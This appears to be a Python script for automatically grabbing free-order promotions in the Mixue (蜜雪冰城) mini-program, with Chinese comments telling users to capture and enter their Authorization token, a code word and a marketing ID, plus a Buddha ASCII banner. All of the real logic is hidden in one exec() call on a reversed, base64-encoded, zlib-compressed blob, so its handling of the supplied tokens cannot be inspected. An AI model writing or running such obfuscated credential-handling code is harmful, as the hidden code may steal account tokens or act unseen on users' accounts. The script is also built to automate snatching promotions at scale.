#   --------------------------------注释区--------------------------------
#   入口:蜜雪冰城小程序
#   变量: yuanshen_mxbq_aw填口令
#         yuanshen_mxbqqg填Access-Token
#         yuanshen_mxbqqg_aid填marketingId 可以提前抓好 好像一天一变
#   多号分割方式 [ @ 或 换行 或 新建同名变量 ]
#   抓取Authorization的值填入
#   corn: 需要抢免单的整点前运行
thread_m = 1 #并发线程数
#   --------------------------------一般不动区--------------------------------
#                     _ooOoo_
#                    o8888888o
#                    88" . "88
#                    (| -_- |)
#                     O\ = /O
#                 ____/`---'\____
#               .   ' \\| |// `.
#                / \\||| : |||// \
#              / _||||| -:- |||||- \
#                | | \\\ - /// | |
#              | \_| ''\---/'' | |
#               \ .-\__ `-` ___/-. /
#            ___`. .' /--.--\ `. . __
#         ."" '< `.___\_<|>_/___.' >'"".
#        | | : `- \`.;`\ _ /`;.`/ - ` : | |
#          \ \ `-. \_ __\ /__ _/ .-` / /
#  ======`-.____`-.___\_____/___.-`____.-'======
#                     `=---='
# 
#  .............................................
#           佛祖保佑             永无BUG
#           佛祖镇楼             BUG辟邪
#   --------------------------------代码区--------------------------------
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
